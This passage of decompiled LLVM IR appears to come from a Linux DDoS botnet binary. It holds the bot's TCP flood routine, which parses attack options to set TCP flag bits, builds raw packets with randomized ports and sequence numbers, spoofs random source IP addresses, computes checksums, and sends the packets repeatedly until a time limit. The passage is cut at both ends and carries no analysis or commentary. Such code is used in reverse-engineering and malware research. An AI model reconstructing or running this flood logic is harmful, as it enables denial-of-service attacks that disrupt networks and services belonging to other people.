  store i1 %v5_804e18b, i1* %cf.global-to-local, align 1
  %v1_804e18e = add i32 %v0_804e18b, -12
  %v2_804e18e = inttoptr i32 %v1_804e18e to i32*
  store i32 ptrtoint (i32* @global_var_8058c11.306 to i32), i32* %v2_804e18e, align 4
  %v0_804e193 = load i32, i32* @eax, align 4
  %v2_804e193 = add i32 %v0_804e18b, -16
  %v3_804e193 = inttoptr i32 %v2_804e193 to i32*
  store i32 %v0_804e193, i32* %v3_804e193, align 4
  %v3_804e194 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8058c0d.305 to i32))
  store i32 %v3_804e194, i32* %eax.global-to-local, align 4
  %v5_804e19c = inttoptr i32 %v3_804e194 to i8*
  store i8* %v5_804e19c, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804e34a21 = icmp eq i32 %v3_804e194, 0
  %v1_804e34e28 = icmp eq i1 %v5_804e34a21, false
  br i1 %v1_804e34e28, label %dec_label_pc_804e1a4.lr.ph, label %dec_label_pc_804e354

dec_label_pc_804e1a4.lr.ph:                       ; preds = %dec_label_pc_804e188
  %v1_804e311 = add i32 %v2_804e08b, 33
  %v2_804e311 = inttoptr i32 %v1_804e311 to i8*
  %tmp103 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804e1a4

dec_label_pc_804e1a4:                             ; preds = %dec_label_pc_804e1a4.lr.ph, %dec_label_pc_804e335
  %v3_804e324 = phi i8* [ %v5_804e19c, %dec_label_pc_804e1a4.lr.ph ], [ %tmp104, %dec_label_pc_804e335 ]
  %stack_var_-156.130 = phi i8* [ %tmp49, %dec_label_pc_804e1a4.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804e335 ]
  %stack_var_-160.129 = phi i32 [ %tmp48, %dec_label_pc_804e1a4.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804e335 ]
  %v4_804e1a4 = ptrtoint i8* %v3_804e324 to i32
  store i32 %v4_804e1a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e1a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058c13.307 to i32), i32* @edi, align 4
  %v6_804e1c2 = call i32 @_strncmp(i8* %v3_804e324, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058c13.307, i32 0, i32 0), i32 4)
  %v7_804e1c2 = urem i32 %v6_804e1c2, 2
  %v8_804e1c2 = icmp eq i32 %v7_804e1c2, 0
  %v0_804e1c4 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e1c4 = or i1 %v0_804e1c4, %v8_804e1c2
  %v3_804e1c4 = zext i1 %v2_804e1c4 to i32
  %v4_804e1c4 = load i32, i32* @edx, align 4
  %v5_804e1c4 = and i32 %v4_804e1c4, -256
  %v6_804e1c4 = or i32 %v3_804e1c4, %v5_804e1c4
  %v7_804e1c4 = xor i32 %v6_804e1c4, 1
  store i32 %v7_804e1c4, i32* %edx.global-to-local, align 4
  %v3_804e1ca = and i32 %v6_804e1c2, -256
  %v1_804e1cc = trunc i32 %v7_804e1c4 to i8
  %v3_804e1cc = zext i1 %v0_804e1c4 to i8
  %v4_804e1cc = sub nsw i8 %v1_804e1cc, %v3_804e1cc
  %v15_804e1cc = icmp eq i8 %v4_804e1cc, 0
  %v20_804e1cc = zext i8 %v4_804e1cc to i32
  %v23_804e1cc = or i32 %v20_804e1cc, %v3_804e1ca
  store i32 %v23_804e1cc, i32* @ecx, align 4
  %v2_804e1d0 = sext i8 %v4_804e1cc to i32
  store i32 %v2_804e1d0, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e1d5 = icmp eq i1 %v15_804e1cc, false
  br i1 %v1_804e1d5, label %dec_label_pc_804e1e8, label %dec_label_pc_804e1d7

dec_label_pc_804e1d7:                             ; preds = %dec_label_pc_804e1a4
  store i32 %v1_804e0a3, i32* @eax, align 4
  %v3_804e1da = load i8, i8* %v2_804e311, align 1
  %v4_804e1da = zext i8 %v3_804e1da to i32
  %v7_804e1da = or i32 %v5_804e1c4, %v4_804e1da
  %v1_804e1dd = or i32 %v7_804e1da, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e1dd = trunc i32 %v1_804e1dd to i8
  store i32 %v1_804e1dd, i32* @edx, align 4
  store i8 %v3_804e1dd, i8* %v2_804e311, align 1
  br label %dec_label_pc_804e335

dec_label_pc_804e1e8:                             ; preds = %dec_label_pc_804e1a4
  store i32 %v4_804e1a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e1a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058c17.308 to i32), i32* @edi, align 4
  %v6_804e206 = call i32 @_strncmp(i8* %v3_804e324, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058c17.308, i32 0, i32 0), i32 4)
  %v7_804e206 = urem i32 %v6_804e206, 2
  %v8_804e206 = icmp eq i32 %v7_804e206, 0
  %v0_804e208 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e208 = or i1 %v0_804e208, %v8_804e206
  %v3_804e208 = zext i1 %v2_804e208 to i32
  %v4_804e208 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e208 = and i32 %v4_804e208, -256
  %v6_804e208 = or i32 %v3_804e208, %v5_804e208
  %v7_804e208 = xor i32 %v6_804e208, 1
  store i32 %v7_804e208, i32* %edx.global-to-local, align 4
  %v3_804e20e = and i32 %v6_804e206, -256
  %v1_804e210 = trunc i32 %v7_804e208 to i8
  %v3_804e210 = zext i1 %v0_804e208 to i8
  %v4_804e210 = sub nsw i8 %v1_804e210, %v3_804e210
  %v15_804e210 = icmp eq i8 %v4_804e210, 0
  %v20_804e210 = zext i8 %v4_804e210 to i32
  %v23_804e210 = or i32 %v20_804e210, %v3_804e20e
  store i32 %v23_804e210, i32* @ecx, align 4
  %v2_804e214 = sext i8 %v4_804e210 to i32
  store i32 %v2_804e214, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e219 = icmp eq i1 %v15_804e210, false
  br i1 %v1_804e219, label %dec_label_pc_804e22c, label %dec_label_pc_804e21b

dec_label_pc_804e21b:                             ; preds = %dec_label_pc_804e1e8
  store i32 %v1_804e0a3, i32* @eax, align 4
  %v3_804e21e = load i8, i8* %v2_804e311, align 1
  %v4_804e21e = zext i8 %v3_804e21e to i32
  %v7_804e21e = or i32 %v5_804e208, %v4_804e21e
  %v1_804e221 = or i32 %v7_804e21e, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e221 = trunc i32 %v1_804e221 to i8
  store i32 %v1_804e221, i32* @edx, align 4
  store i8 %v3_804e221, i8* %v2_804e311, align 1
  br label %dec_label_pc_804e335

dec_label_pc_804e22c:                             ; preds = %dec_label_pc_804e1e8
  store i32 %v4_804e1a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e1a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058c1b.309 to i32), i32* @edi, align 4
  %v6_804e250 = call i32 @_strncmp(i8* %v3_804e324, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058c1b.309, i32 0, i32 0), i32 4)
  %v7_804e250 = urem i32 %v6_804e250, 2
  %v8_804e250 = icmp eq i32 %v7_804e250, 0
  %v0_804e252 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e252 = or i1 %v0_804e252, %v8_804e250
  %v3_804e252 = zext i1 %v2_804e252 to i32
  %v4_804e252 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e252 = and i32 %v4_804e252, -256
  %v6_804e252 = or i32 %v3_804e252, %v5_804e252
  %v7_804e252 = xor i32 %v6_804e252, 1
  store i32 %v7_804e252, i32* %edx.global-to-local, align 4
  %v3_804e258 = and i32 %v6_804e250, -256
  %v1_804e25a = trunc i32 %v7_804e252 to i8
  %v3_804e25a = zext i1 %v0_804e252 to i8
  %v4_804e25a = sub nsw i8 %v1_804e25a, %v3_804e25a
  %v15_804e25a = icmp eq i8 %v4_804e25a, 0
  %v20_804e25a = zext i8 %v4_804e25a to i32
  %v23_804e25a = or i32 %v20_804e25a, %v3_804e258
  store i32 %v23_804e25a, i32* @ecx, align 4
  %v2_804e25e = sext i8 %v4_804e25a to i32
  store i32 %v2_804e25e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e263 = icmp eq i1 %v15_804e25a, false
  br i1 %v1_804e263, label %dec_label_pc_804e276, label %dec_label_pc_804e265

dec_label_pc_804e265:                             ; preds = %dec_label_pc_804e22c
  store i32 %v1_804e0a3, i32* @eax, align 4
  %v3_804e268 = load i8, i8* %v2_804e311, align 1
  %v4_804e268 = zext i8 %v3_804e268 to i32
  %v7_804e268 = or i32 %v5_804e252, %v4_804e268
  %v1_804e26b = or i32 %v7_804e268, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e26b = trunc i32 %v1_804e26b to i8
  store i32 %v1_804e26b, i32* @edx, align 4
  store i8 %v3_804e26b, i8* %v2_804e311, align 1
  br label %dec_label_pc_804e335

dec_label_pc_804e276:                             ; preds = %dec_label_pc_804e22c
  store i32 %v4_804e1a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e1a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058c1f.310 to i32), i32* @edi, align 4
  %v6_804e2a6 = call i32 @_strncmp(i8* %v3_804e324, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058c1f.310, i32 0, i32 0), i32 4)
  %v7_804e2a6 = urem i32 %v6_804e2a6, 2
  %v8_804e2a6 = icmp eq i32 %v7_804e2a6, 0
  %v0_804e2a8 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e2a8 = or i1 %v0_804e2a8, %v8_804e2a6
  %v3_804e2a8 = zext i1 %v2_804e2a8 to i32
  %v4_804e2a8 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e2a8 = and i32 %v4_804e2a8, -256
  %v6_804e2a8 = or i32 %v3_804e2a8, %v5_804e2a8
  %v7_804e2a8 = xor i32 %v6_804e2a8, 1
  store i32 %v7_804e2a8, i32* %edx.global-to-local, align 4
  %v3_804e2ae = and i32 %v6_804e2a6, -256
  %v1_804e2b0 = trunc i32 %v7_804e2a8 to i8
  %v3_804e2b0 = zext i1 %v0_804e2a8 to i8
  %v4_804e2b0 = sub nsw i8 %v1_804e2b0, %v3_804e2b0
  %v15_804e2b0 = icmp eq i8 %v4_804e2b0, 0
  %v20_804e2b0 = zext i8 %v4_804e2b0 to i32
  %v23_804e2b0 = or i32 %v20_804e2b0, %v3_804e2ae
  store i32 %v23_804e2b0, i32* @ecx, align 4
  %v2_804e2b4 = sext i8 %v4_804e2b0 to i32
  store i32 %v2_804e2b4, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e2b9 = icmp eq i1 %v15_804e2b0, false
  br i1 %v1_804e2b9, label %dec_label_pc_804e2c9, label %dec_label_pc_804e2bb

dec_label_pc_804e2bb:                             ; preds = %dec_label_pc_804e276
  store i32 %v1_804e0a3, i32* @eax, align 4
  %v3_804e2be = load i8, i8* %v2_804e311, align 1
  %v4_804e2be = zext i8 %v3_804e2be to i32
  %v7_804e2be = or i32 %v5_804e2a8, %v4_804e2be
  %v1_804e2c1 = or i32 %v7_804e2be, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e2c1 = trunc i32 %v1_804e2c1 to i8
  store i32 %v1_804e2c1, i32* @edx, align 4
  store i8 %v3_804e2c1, i8* %v2_804e311, align 1
  br label %dec_label_pc_804e335

dec_label_pc_804e2c9:                             ; preds = %dec_label_pc_804e276
  store i32 %v4_804e1a4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e1a4, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8058c23.311 to i32), i32* @edi, align 4
  %v6_804e2f9 = call i32 @_strncmp(i8* %v3_804e324, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058c23.311, i32 0, i32 0), i32 4)
  %v7_804e2f9 = urem i32 %v6_804e2f9, 2
  %v8_804e2f9 = icmp eq i32 %v7_804e2f9, 0
  %v0_804e2fb = load i1, i1* %cf.global-to-local, align 1
  %v2_804e2fb = or i1 %v0_804e2fb, %v8_804e2f9
  %v3_804e2fb = zext i1 %v2_804e2fb to i32
  %v4_804e2fb = load i32, i32* %edx.global-to-local, align 4
  %v5_804e2fb = and i32 %v4_804e2fb, -256
  %v6_804e2fb = or i32 %v3_804e2fb, %v5_804e2fb
  %v7_804e2fb = xor i32 %v6_804e2fb, 1
  store i32 %v7_804e2fb, i32* %edx.global-to-local, align 4
  %v3_804e301 = and i32 %v6_804e2f9, -256
  %v1_804e303 = trunc i32 %v7_804e2fb to i8
  %v3_804e303 = zext i1 %v0_804e2fb to i8
  %v4_804e303 = sub nsw i8 %v1_804e303, %v3_804e303
  %v15_804e303 = icmp eq i8 %v4_804e303, 0
  %v20_804e303 = zext i8 %v4_804e303 to i32
  %v23_804e303 = or i32 %v20_804e303, %v3_804e301
  store i32 %v23_804e303, i32* @ecx, align 4
  %v2_804e307 = sext i8 %v4_804e303 to i32
  store i32 %v2_804e307, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e30c = icmp eq i1 %v15_804e303, false
  br i1 %v1_804e30c, label %dec_label_pc_804e31c, label %dec_label_pc_804e30e

dec_label_pc_804e30e:                             ; preds = %dec_label_pc_804e2c9
  store i32 %v1_804e0a3, i32* @eax, align 4
  %v3_804e311 = load i8, i8* %v2_804e311, align 1
  %v4_804e311 = zext i8 %v3_804e311 to i32
  %v7_804e311 = or i32 %v5_804e2fb, %v4_804e311
  %v1_804e314 = or i32 %v7_804e311, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804e314 = trunc i32 %v1_804e314 to i8
  store i32 %v1_804e314, i32* @edx, align 4
  store i8 %v3_804e314, i8* %v2_804e311, align 1
  br label %dec_label_pc_804e335

dec_label_pc_804e31c:                             ; preds = %dec_label_pc_804e2c9
  %v0_804e31c = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_804e31c, i32* %eax.global-to-local, align 4
  %v0_804e321 = load i32, i32* @esp, align 4
  %v5_804e321 = icmp ult i32 %v0_804e321, 4
  store i1 %v5_804e321, i1* %cf.global-to-local, align 1
  %v6_804e324 = add i32 %v0_804e321, -8
  %v7_804e324 = inttoptr i32 %v6_804e324 to i32*
  store i32 %v4_804e1a4, i32* %v7_804e324, align 4
  %v1_804e327 = add i32 %v0_804e321, -12
  %v2_804e327 = inttoptr i32 %v1_804e327 to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_8058c27.312 to i32), i32* %v2_804e327, align 4
  %v0_804e32c = load i32, i32* %eax.global-to-local, align 4
  %v2_804e32c = add i32 %v0_804e321, -16
  %v3_804e32c = inttoptr i32 %v2_804e32c to i32*
  store i32 %v0_804e32c, i32* %v3_804e32c, align 4
  %v3_804e32d = call i32 @sockprintf(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8058c23.311 to i32))
  store i32 %v3_804e32d, i32* @eax, align 4
  %v0_804e332 = load i32, i32* @esp, align 4
  %v2_804e332 = icmp ugt i32 %v0_804e332, -17
  store i1 %v2_804e332, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e335

dec_label_pc_804e335:                             ; preds = %dec_label_pc_804e30e, %dec_label_pc_804e2bb, %dec_label_pc_804e265, %dec_label_pc_804e21b, %dec_label_pc_804e1d7, %dec_label_pc_804e31c
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804e31c ], [ 4, %dec_label_pc_804e30e ], [ %stack_var_-160.129, %dec_label_pc_804e2bb ], [ %stack_var_-160.129, %dec_label_pc_804e265 ], [ %stack_var_-160.129, %dec_label_pc_804e21b ], [ %stack_var_-160.129, %dec_label_pc_804e1d7 ]
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058c23.311, i32 0, i32 0), %dec_label_pc_804e31c ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058c23.311, i32 0, i32 0), %dec_label_pc_804e30e ], [ %stack_var_-156.130, %dec_label_pc_804e2bb ], [ %stack_var_-156.130, %dec_label_pc_804e265 ], [ %stack_var_-156.130, %dec_label_pc_804e21b ], [ %stack_var_-156.130, %dec_label_pc_804e1d7 ]
  %v0_804e335 = load i32, i32* @esp, align 4
  %v5_804e335 = icmp ult i32 %v0_804e335, 8
  store i1 %v5_804e335, i1* %cf.global-to-local, align 1
  %v1_804e338 = add i32 %v0_804e335, -12
  %v2_804e338 = inttoptr i32 %v1_804e338 to i32*
  store i32 ptrtoint (i32* @global_var_8058c11.306 to i32), i32* %v2_804e338, align 4
  %v1_804e33d = add i32 %v0_804e335, -16
  %v2_804e33d = inttoptr i32 %v1_804e33d to i32*
  store i32 0, i32* %v2_804e33d, align 4
  %v2_804e33f = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804e33f = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804e33f)
  store i32 %v3_804e33f, i32* %eax.global-to-local, align 4
  store i32 %v3_804e33f, i32* %tmp103, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804e34a = icmp eq i32 %v3_804e33f, 0
  %v1_804e34e = icmp eq i1 %v5_804e34a, false
  %tmp104 = inttoptr i32 %v3_804e33f to i8*
  br i1 %v1_804e34e, label %dec_label_pc_804e1a4, label %dec_label_pc_804e354

dec_label_pc_804e354:                             ; preds = %dec_label_pc_804e335, %dec_label_pc_804e188, %dec_label_pc_804e147
  %v0_804e354 = phi i8* [ %v0_804e354.pre, %dec_label_pc_804e147 ], [ %v5_804e19c, %dec_label_pc_804e188 ], [ %tmp104, %dec_label_pc_804e335 ]
  %v1_804e354 = ptrtoint i8* %v0_804e354 to i32
  %v2_804e354 = call i32 @rand_cmwc(i32 %v1_804e354)
  %sext8 = mul i32 %v2_804e354, 65536
  %v1_804e359 = sdiv i32 %sext8, 65536
  store i32 %v1_804e359, i32* %edx.global-to-local, align 4
  %v1_804e35e = trunc i32 %v1_804e359 to i16
  %v3_804e35e = add i32 %v2_804e08b, 34
  %v4_804e35e = inttoptr i32 %v3_804e35e to i16*
  store i16 %v1_804e35e, i16* %v4_804e35e, align 2
  %v1_804e365 = add i32 %v2_804e08b, 36
  %v2_804e365 = inttoptr i32 %v1_804e365 to i16*
  store i16 0, i16* %v2_804e365, align 4
  store i32 %v1_804e0a3, i32* %eax.global-to-local, align 4
  %v1_804e36e = add i32 %v2_804e08b, 38
  %v2_804e36e = inttoptr i32 %v1_804e36e to i16*
  store i16 0, i16* %v2_804e36e, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804df7a, label %dec_label_pc_804e385, label %dec_label_pc_804e37a

dec_label_pc_804e37a:                             ; preds = %dec_label_pc_804e354
  %v0_804e37a = load i8*, i8** %stack_var_-20, align 4
  %v1_804e37a = ptrtoint i8* %v0_804e37a to i32
  %v2_804e37a = call i32 @rand_cmwc(i32 %v1_804e37a)
  store i32 %v2_804e37a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e39d

dec_label_pc_804e385:                             ; preds = %dec_label_pc_804e354
  %v1_804e388 = urem i32 %arg2, 65536
  store i32 %v1_804e388, i32* %eax.global-to-local, align 4
  %v0_804e38d = load i32, i32* @esp, align 4
  %v5_804e38d = icmp ult i32 %v0_804e38d, 12
  store i1 %v5_804e38d, i1* %cf.global-to-local, align 1
  %v2_804e390 = add i32 %v0_804e38d, -16
  %v3_804e390 = inttoptr i32 %v2_804e390 to i32*
  store i32 %v1_804e388, i32* %v3_804e390, align 4
  %v1_804e391 = sext i16 %tmp47 to i32
  %v2_804e391 = call i32 @htons(i32 %v1_804e391)
  store i32 %v2_804e391, i32* %eax.global-to-local, align 4
  %v0_804e396 = load i32, i32* @esp, align 4
  %v2_804e396 = icmp ugt i32 %v0_804e396, -17
  store i1 %v2_804e396, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e39d

dec_label_pc_804e39d:                             ; preds = %dec_label_pc_804e37a, %dec_label_pc_804e385
  %storemerge.in = phi i32 [ %v2_804e391, %dec_label_pc_804e385 ], [ %v2_804e37a, %dec_label_pc_804e37a ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804e0a3, i32* %eax.global-to-local, align 4
  %v4_804e3a0 = urem i32 %storemerge.in, 65536
  %v5_804e3a0 = load i32, i32* @esi, align 4
  %v6_804e3a0 = and i32 %v5_804e3a0, -65536
  %v7_804e3a0 = or i32 %v6_804e3a0, %v4_804e3a0
  store i32 %v7_804e3a0, i32* @esi, align 4
  %v3_804e3a4 = add i32 %v2_804e08b, 22
  %v4_804e3a4 = inttoptr i32 %v3_804e3a4 to i16*
  store i16 %storemerge, i16* %v4_804e3a4, align 2
  %v0_804e3a8 = load i32, i32* @esp, align 4
  %v5_804e3a8 = icmp ult i32 %v0_804e3a8, 8
  store i1 %v5_804e3a8, i1* %cf.global-to-local, align 1
  %v6_804e3ab = add i32 %v0_804e3a8, -12
  %v7_804e3ab = inttoptr i32 %v6_804e3ab to i32*
  store i32 %v1_804e0a3, i32* %v7_804e3ab, align 4
  %v5_804e3ae = add i32 %v0_804e3a8, -16
  %v6_804e3ae = inttoptr i32 %v5_804e3ae to i32*
  store i32 %v2_804e08b, i32* %v6_804e3ae, align 4
  %v0_804e3b1 = call i32 @tcpcsum()
  %v1_804e3b1 = trunc i32 %v0_804e3b1 to i16
  %sext13 = mul i32 %v0_804e3b1, 65536
  %v1_804e3b9 = sdiv i32 %sext13, 65536
  store i32 %v1_804e3b9, i32* %edx.global-to-local, align 4
  store i16 %v1_804e3b1, i16* %v2_804e365, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  %v1_804e3c5 = or i32 %v2_804e08b, 2
  %v2_804e3c5 = inttoptr i32 %v1_804e3c5 to i16*
  %v3_804e3c5 = load i16, i16* %v2_804e3c5, align 2
  %v4_804e3c5 = zext i16 %v3_804e3c5 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804e3c5, i32* %edx.global-to-local, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  %v1_804e3d4 = load i32, i32* @esp, align 4
  %v2_804e3d4 = add i32 %v1_804e3d4, -4
  %v3_804e3d4 = inttoptr i32 %v2_804e3d4 to i32*
  store i32 %v4_804e3c5, i32* %v3_804e3d4, align 4
  %v0_804e3d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e3d5 = add i32 %v1_804e3d4, -8
  %v3_804e3d5 = inttoptr i32 %v2_804e3d5 to i32*
  store i32 %v0_804e3d5, i32* %v3_804e3d5, align 4
  %sext14 = mul i32 %storemerge.in, 65536
  %v1_804e3d6 = sdiv i32 %sext14, 65536
  %v3_804e3d6 = inttoptr i32 %v1_804e3d6 to i16*
  %v4_804e3d6 = call i32 @csum(i16* %v3_804e3d6, i32 ptrtoint (i32* @0 to i32))
  %v5_804e3d6 = trunc i32 %v4_804e3d6 to i16
  %sext15 = mul i32 %v4_804e3d6, 65536
  %v1_804e3de = sdiv i32 %sext15, 65536
  store i32 %v1_804e3de, i32* %edx.global-to-local, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  %v3_804e3e3 = or i32 %v2_804e08b, 10
  %v4_804e3e3 = inttoptr i32 %v3_804e3e3 to i16*
  store i16 %v5_804e3d6, i16* %v4_804e3e3, align 2
  %v0_804e3e7 = load i32, i32* @esp, align 4
  %v5_804e3e7 = icmp ult i32 %v0_804e3e7, 12
  store i1 %v5_804e3e7, i1* %cf.global-to-local, align 1
  %v1_804e3ea = add i32 %v0_804e3e7, -16
  %v2_804e3ea = inttoptr i32 %v1_804e3ea to i32*
  store i32 0, i32* %v2_804e3ea, align 4
  %v2_804e3ec = inttoptr i32 %v1_804e3d6 to i32*
  %v3_804e3ec = call i32 @__GI_time(i32* %v2_804e3ec)
  %v0_804e3f1 = load i32, i32* @esp, align 4
  %v1_804e3f1 = add i32 %v0_804e3f1, 16
  %v5_804e3f4 = add i32 %v3_804e3ec, %arg3
  %v10_804e3f4 = icmp ult i32 %v5_804e3f4, %v3_804e3ec
  store i1 %v10_804e3f4, i1* %cf.global-to-local, align 1
  store i32 %v5_804e3f4, i32* %eax.global-to-local, align 4
  %v2_804e43f = or i32 %v2_804e08b, 12
  %v3_804e43f = inttoptr i32 %v2_804e43f to i32*
  %v3_804e44c = or i32 %v2_804e08b, 4
  %v4_804e44c = inttoptr i32 %v3_804e44c to i16*
  br label %dec_label_pc_804e403

dec_label_pc_804e403:                             ; preds = %dec_label_pc_804e4ba, %dec_label_pc_804e4d8, %dec_label_pc_804e39d
  %v0_804e409 = phi i32 [ %v1_804e3f1, %dec_label_pc_804e39d ], [ %v0_804e409.pre.pre, %dec_label_pc_804e4d8 ], [ %v1_804e4c4, %dec_label_pc_804e4ba ]
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804e39d ], [ %v4_804e4d8, %dec_label_pc_804e4d8 ], [ 0, %dec_label_pc_804e4ba ]
  store i32 %v2_804dfa2, i32* %eax.global-to-local, align 4
  store i32 %v2_804e08b, i32* %edx.global-to-local, align 4
  %v5_804e409 = icmp ult i32 %v0_804e409, 8
  store i1 %v5_804e409, i1* %cf.global-to-local, align 1
  %v1_804e40c = add i32 %v0_804e409, -12
  %v2_804e40c = inttoptr i32 %v1_804e40c to i32*
  store i32 16, i32* %v2_804e40c, align 4
  %v2_804e40e = add i32 %v0_804e409, -16
  %v3_804e40e = inttoptr i32 %v2_804e40e to i32*
  store i32 %v2_804dfa2, i32* %v3_804e40e, align 4
  %v1_804e40f = add i32 %v0_804e409, -20
  %v2_804e40f = inttoptr i32 %v1_804e40f to i32*
  store i32 0, i32* %v2_804e40f, align 4
  %v5_804e411 = add i32 %v0_804e409, -24
  %v6_804e411 = inttoptr i32 %v5_804e411 to i32*
  store i32 %v1_804e06b, i32* %v6_804e411, align 4
  %v0_804e414 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e414 = add i32 %v0_804e409, -28
  %v3_804e414 = inttoptr i32 %v2_804e414 to i32*
  store i32 %v0_804e414, i32* %v3_804e414, align 4
  %v5_804e415 = add i32 %v0_804e409, -32
  %v6_804e415 = inttoptr i32 %v5_804e415 to i32*
  store i32 %v4_804dfd9, i32* %v6_804e415, align 4
  %v1_804e418 = load i32, i32* %stack_var_-64, align 4
  %v2_804e418 = load i32, i32* %stack_var_-60, align 4
  %v3_804e418 = load i32, i32* %stack_var_-56, align 4
  %v4_804e418 = load i32, i32* %stack_var_-52, align 4
  %v6_804e418 = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804e418, i32 %v2_804e418, i32 %v3_804e418, i32 %v4_804e418, i32 0)
  store i32 %v6_804e418, i32* %eax.global-to-local, align 4
  %v0_804e41d = load i32, i32* @esp, align 4
  %v1_804e41d = add i32 %v0_804e41d, 32
  %v5_804e420 = icmp ult i32 %v1_804e41d, 12
  store i1 %v5_804e420, i1* %cf.global-to-local, align 1
  %v5_804e423 = add i32 %v0_804e41d, 16
  %v6_804e423 = inttoptr i32 %v5_804e423 to i32*
  store i32 %storemerge12, i32* %v6_804e423, align 4
  %v1_804e426 = load i32, i32* %stack_var_-64, align 4
  %v2_804e426 = call i32 @GetRandomIP(i32 %stack_var_-68.0, i32 %v1_804e426)
  store i32 %v2_804e426, i32* %eax.global-to-local, align 4
  %v0_804e42b = load i32, i32* @esp, align 4
  %v1_804e42b = add i32 %v0_804e42b, 16
  %v5_804e42e = icmp ult i32 %v1_804e42b, 12
  store i1 %v5_804e42e, i1* %cf.global-to-local, align 1
  %v3_804e431 = inttoptr i32 %v0_804e42b to i32*
  store i32 %v2_804e426, i32* %v3_804e431, align 4
  %v0_804e432 = call i32 @htonl()
  %v0_804e437 = load i32, i32* @esp, align 4
  %v2_804e437 = icmp ugt i32 %v0_804e437, -17
  store i1 %v2_804e437, i1* %cf.global-to-local, align 1
  store i32 %v0_804e432, i32* %edx.global-to-local, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  store i32 %v0_804e432, i32* %v3_804e43f, align 4
  %v1_804e442 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext9 = mul i32 %v1_804e442, 65536
  %v1_804e447 = sdiv i32 %sext9, 65536
  store i32 %v1_804e447, i32* %edx.global-to-local, align 4
  store i32 %v2_804e08b, i32* %eax.global-to-local, align 4
  %v1_804e44c = trunc i32 %v1_804e447 to i16
  store i16 %v1_804e44c, i16* %v4_804e44c, align 4
  %v1_804e450 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804e450, i32* %edx.global-to-local, align 4
  store i32 %v1_804e0a3, i32* %eax.global-to-local, align 4
  store i32 %v1_804e450, i32* %v3_804e0f8, align 8
  %v1_804e45d = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext10 = mul i32 %v1_804e45d, 65536
  %v1_804e462 = sdiv i32 %sext10, 65536
  store i32 %v1_804e462, i32* %edx.global-to-local, align 4
  %v1_804e467 = trunc i32 %v1_804e462 to i16
  store i16 %v1_804e467, i16* %v5_804e0a6, align 4
  store i32 %v1_804e0a3, i32* %eax.global-to-local, align 4
  store i16 0, i16* %v2_804e365, align 4
  %v0_804e473 = load i32, i32* @esp, align 4
